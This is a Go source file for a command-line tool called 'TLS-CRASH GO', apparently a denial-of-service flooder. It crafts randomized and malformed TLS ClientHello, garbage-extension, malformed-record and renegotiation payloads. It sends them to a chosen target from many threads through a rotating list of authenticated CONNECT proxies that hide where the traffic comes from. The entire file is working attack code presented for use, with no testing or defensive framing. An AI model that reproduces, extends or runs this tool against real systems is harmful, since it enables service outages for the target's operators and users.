// TLS-CRASH GO — CLI Edition
// Build: go build -ldflags "-s -w" -o tls-crash-cli.exe main-cli.go
package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ===== TLS PAYLOAD BUILDERS =====

func randInt(min, max int) int {
	if max <= min {
		return min
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
	return min + int(n.Int64())
}

func extSNI(host string) []byte {
	name := []byte(host)
	var entry bytes.Buffer
	entry.WriteByte(0x00)
	binary.Write(&entry, binary.BigEndian, uint16(len(name)))
	entry.Write(name)
	data := entry.Bytes()
	var out bytes.Buffer
	binary.Write(&out, binary.BigEndian, uint16(0x0000))
	binary.Write(&out, binary.BigEndian, uint16(len(data)))
	out.Write(data)
	return out.Bytes()
}

func extSupportedVersions() []byte {
	data := []byte{0x04, 0x03, 0x04, 0x03, 0x03, 0x03, 0x02}
	var out bytes.Buffer
	binary.Write(&out, binary.BigEndian, uint16(0x002b))
	binary.Write(&out, binary.BigEndian, uint16(len(data)))
	out.Write(data)
	return out.Bytes()
}

func extSigAlgs() []byte {
	algs := []byte{0x04, 0x03, 0x08, 0x04, 0x04, 0x01, 0x05, 0x03, 0x08, 0x05, 0x05, 0x01}
	var out bytes.Buffer
	binary.Write(&out, binary.BigEndian, uint16(0x000d))
	binary.Write(&out, binary.BigEndian, uint16(len(algs)))
	out.Write(algs)
	return out.Bytes()
}

func extGarbage() []byte {
	n := randInt(4, 256)
	data := make([]byte, n)
	rand.Read(data)
	extType := randInt(0x1000, 0xFFFE)
	var out bytes.Buffer
	binary.Write(&out, binary.BigEndian, uint16(extType))
	binary.Write(&out, binary.BigEndian, uint16(n))
	out.Write(data)
	return out.Bytes()
}

func buildClientHello(sni string, chaos bool) []byte {
	randomBytes := make([]byte, 32)
	rand.Read(randomBytes)
	sessLen := randInt(0, 32)
	sessionID := make([]byte, sessLen)
	rand.Read(sessionID)

	var ciphers []byte
	if chaos {
		n := randInt(2, 128)
		ciphers = make([]byte, n*2)
		for i := 0; i < n; i++ {
			v := randInt(0, 0xFFFF)
			ciphers[i*2] = byte(v >> 8)
			ciphers[i*2+1] = byte(v)
		}
	} else {
		ciphers = []byte{0x13, 0x01, 0x13, 0x02, 0x13, 0x03, 0xc0, 0x2b, 0xc0, 0x2f}
	}

	ext := append(extSNI(sni), extSupportedVersions()...)
	ext = append(ext, extSigAlgs()...)
	if randInt(0, 100) < 30 {
		ext = append(ext, extGarbage()...)
	}

	var body bytes.Buffer
	body.Write([]byte{0x03, 0x03})
	body.Write(randomBytes)
	body.WriteByte(byte(len(sessionID)))
	body.Write(sessionID)
	binary.Write(&body, binary.BigEndian, uint16(len(ciphers)))
	body.Write(ciphers)
	body.Write([]byte{0x01, 0x00})
	binary.Write(&body, binary.BigEndian, uint16(len(ext)))
	body.Write(ext)

	bodyB := body.Bytes()
	var hs bytes.Buffer
	hs.WriteByte(0x01)
	hs.Write([]byte{byte(len(bodyB) >> 16), byte(len(bodyB) >> 8), byte(len(bodyB))})
	hs.Write(bodyB)

	hsB := hs.Bytes()
	var rec bytes.Buffer
	rec.WriteByte(0x16)
	rec.Write([]byte{0x03, 0x03})
	binary.Write(&rec, binary.BigEndian, uint16(len(hsB)))
	rec.Write(hsB)
	return rec.Bytes()
}

func buildMalformedRecord() []byte {
	kinds := []int{0x16, 0x15, 0x17, randInt(0, 255)}
	kind := kinds[randInt(0, len(kinds))]
	lengths := []int{0xFFFF, 0x7FFF, 0x0001, 0x0000}
	length := lengths[randInt(0, len(lengths))]
	plen := randInt(0, 64)
	payload := make([]byte, plen)
	rand.Read(payload)
	var out bytes.Buffer
	out.WriteByte(byte(kind))
	out.Write([]byte{0x03, 0x03})
	binary.Write(&out, binary.BigEndian, uint16(length))
	out.Write(payload)
	return out.Bytes()
}

func buildRenegRequest() []byte {
	randomBytes := make([]byte, 32)
	rand.Read(randomBytes)
	var body bytes.Buffer
	body.Write([]byte{0x03, 0x03})
	body.Write(randomBytes)
	body.WriteByte(0x00)
	body.Write([]byte{0x00, 0x02, 0x00, 0x2f})
	body.Write([]byte{0x01, 0x00})
	body.Write([]byte{0x00, 0x00})
	bodyB := body.Bytes()

	var hs bytes.Buffer
	hs.WriteByte(0x01)
	hs.Write([]byte{byte(len(bodyB) >> 16), byte(len(bodyB) >> 8), byte(len(bodyB))})
	hs.Write(bodyB)
	hsB := hs.Bytes()

	var rec bytes.Buffer
	rec.WriteByte(0x16)
	rec.Write([]byte{0x03, 0x03})
	binary.Write(&rec, binary.BigEndian, uint16(len(hsB)))
	rec.Write(hsB)
	return rec.Bytes()
}

// ===== PROXY =====

type Proxy struct {
	Host string
	Port int
	User string
	Pass string
}

func parseProxyLine(line string) *Proxy {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return nil
	}
	if idx := strings.Index(line, "://"); idx >= 0 {
		line = line[idx+3:]
	}
	var user, pass string
	if at := strings.LastIndex(line, "@"); at >= 0 {
		cred := line[:at]
		line = line[at+1:]
		if colon := strings.Index(cred, ":"); colon >= 0 {
			user = cred[:colon]
			pass = cred[colon+1:]
		}
	}
	parts := strings.Split(line, ":")
	var host, portStr string
	if len(parts) == 4 {
		host, portStr, user, pass = parts[0], parts[1], parts[2], parts[3]
	} else if len(parts) >= 2 {
		host, portStr = parts[0], parts[1]
	} else {
		return nil
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return nil
	}
	return &Proxy{Host: host, Port: port, User: user, Pass: pass}
}

func loadProxies(path string) ([]Proxy, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var out []Proxy
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1024*1024), 1024*1024)
	for sc.Scan() {
		if p := parseProxyLine(sc.Text()); p != nil {
			out = append(out, *p)
		}
	}
	return out, nil
}

// ===== ENGINE =====

type Stats struct {
	Conns     int64
	PPS       int64
	Errors    int64
	Bytes     int64
	ProxyDead int64
}

type Engine struct {
	target   string
	sni      string
	mode     string
	threads  int
	batch    int
	timeout  time.Duration
	keepAlive time.Duration
	proxies  []Proxy
	stats    Stats
	stopCh   chan struct{}
	stopOnce sync.Once
	deadMu   sync.Mutex
	dead     map[string]bool
}

func (e *Engine) Stop() { e.stopOnce.Do(func() { close(e.stopCh) }) }

func (e *Engine) Run() {
	addrs, err := net.LookupHost(strings.Split(e.target, ":")[0])
	if err != nil || len(addrs) == 0 {
		fmt.Printf("[!] resolve gagal: %v\n", err)
		return
	}
	targetAddr := e.target
	fmt.Printf("[+] target: %s\n", targetAddr)
	fmt.Printf("[+] proxies: %d\n", len(e.proxies))

	go func() {
		tick := time.NewTicker(time.Second)
		defer tick.Stop()
		for {
			select {
			case <-e.stopCh:
				return
			case <-tick.C:
				w := atomic.SwapInt64((*int64)(&e.stats.PPS), 0)
				_ = w
			}
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < e.threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-e.stopCh:
					return
				default:
				}
				for j := 0; j < e.batch; j++ {
					e.attempt(targetAddr)
				}
			}
		}()
	}
	wg.Wait()
}

func (e *Engine) attempt(targetAddr string) {
	if len(e.proxies) == 0 {
		return
	}
	p := &e.proxies[randInt(0, len(e.proxies))]

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", p.Host, p.Port), e.timeout)
	if err != nil {
		atomic.AddInt64(&e.stats.Errors, 1)
		return
	}

	// CONNECT
	var req bytes.Buffer
	req.WriteString("CONNECT " + targetAddr + " HTTP/1.1\r\n")
	req.WriteString("Host: " + targetAddr + "\r\n")
	req.WriteString("User-Agent: Mozilla/5.0\r\n")
	if p.User != "" && p.Pass != "" {
		token := base64.StdEncoding.EncodeToString([]byte(p.User + ":" + p.Pass))
		req.WriteString("Proxy-Authorization: Basic " + token + "\r\n")
	}
	req.WriteString("\r\n")

	conn.SetDeadline(time.Now().Add(e.timeout))
	if _, err := conn.Write(req.Bytes()); err != nil {
		conn.Close()
		atomic.AddInt64(&e.stats.Errors, 1)
		return
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || !bytes.Contains(buf[:n], []byte(" 200 ")) {
		conn.Close()
		atomic.AddInt64(&e.stats.Errors, 1)
		return
	}

	atomic.AddInt64(&e.stats.Conns, 1)

	mode := e.mode
	if mode == "tls_mixed" {
		modes := []string{"tls_hello", "tls_malformed", "tls_reneg"}
		mode = modes[randInt(0, len(modes))]
	}

	var payload []byte
	switch mode {
	case "tls_hello":
		payload = buildClientHello(e.sni, true)
	case "tls_malformed":
		payload = buildMalformedRecord()
	case "tls_reneg":
		payload = buildRenegRequest()
	default:
		payload = buildClientHello(e.sni, true)
	}

	if _, err := conn.Write(payload); err != nil {
		conn.Close()
		atomic.AddInt64(&e.stats.Errors, 1)
		return
	}
	atomic.AddInt64(&e.stats.Bytes, int64(len(payload)))
	atomic.AddInt64((*int64)(&e.stats.PPS), 1)

	// extra fuzz
	if mode == "tls_hello" {
		for i := 0; i < randInt(1, 6); i++ {
			rec := buildMalformedRecord()
			conn.Write(rec)
			atomic.AddInt64(&e.stats.Bytes, int64(len(rec)))
			atomic.AddInt64((*int64)(&e.stats.PPS), 1)
		}
	}
	if e.keepAlive > 0 {
		time.Sleep(time.Duration(randInt(0, int(e.keepAlive.Milliseconds()))) * time.Millisecond)
	}
	conn.Close()
}

// ===== MAIN CLI =====

func main() {
	target := flag.String("t", "from-host.com", "target host")
	port := flag.Int("p", 443, "target port")
	sni := flag.String("sni", "", "SNI host")
	mode := flag.String("m", "tls_mixed", "tls_hello|tls_malformed|tls_reneg|tls_mixed")
	threads := flag.Int("c", 64, "threads")
	batch := flag.Int("b", 32, "batch per thread")
	timeout := flag.Int("to", 8, "timeout seconds")
	keepMs := flag.Int("k", 50, "keep-alive ms")
	proxyFile := flag.String("f", "proxies.txt", "proxy file path")
	flag.Parse()

	if *sni == "" {
		*sni = *target
	}

	proxies, err := loadProxies(*proxyFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] gagal load %s: %v\n", *proxyFile, err)
		os.Exit(1)
	}
	if len(proxies) == 0 {
		fmt.Fprintln(os.Stderr, "[!] proxy list kosong")
		os.Exit(1)
	}

	fmt.Println("===========================================")
	fmt.Println(" TLS-CRASH GO :: CLI :: ALPHA XK")
	fmt.Println("===========================================")

	targetAddr := fmt.Sprintf("%s:%d", *target, *port)

	e := &Engine{
		target:    targetAddr,
		sni:       *sni,
		mode:      *mode,
		threads:   *threads,
		batch:     *batch,
		timeout:   time.Duration(*timeout) * time.Second,
		keepAlive: time.Duration(*keepMs) * time.Millisecond,
		proxies:   proxies,
		stopCh:    make(chan struct{}),
		dead:      make(map[string]bool),
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("\n[STOP]")
		e.Stop()
	}()

	// status printer
	go func() {
		tick := time.NewTicker(time.Second)
		defer tick.Stop()
		for {
			select {
			case <-e.stopCh:
				return
			case <-tick.C:
				fmt.Printf("\rconns=%d pps=%d errors=%d bytes=%d       ",
					atomic.LoadInt64(&e.stats.Conns),
					atomic.LoadInt64((*int64)(&e.stats.PPS)),
					atomic.LoadInt64(&e.stats.Errors),
					atomic.LoadInt64(&e.stats.Bytes))
			}
		}
	}()

	e.Run()
}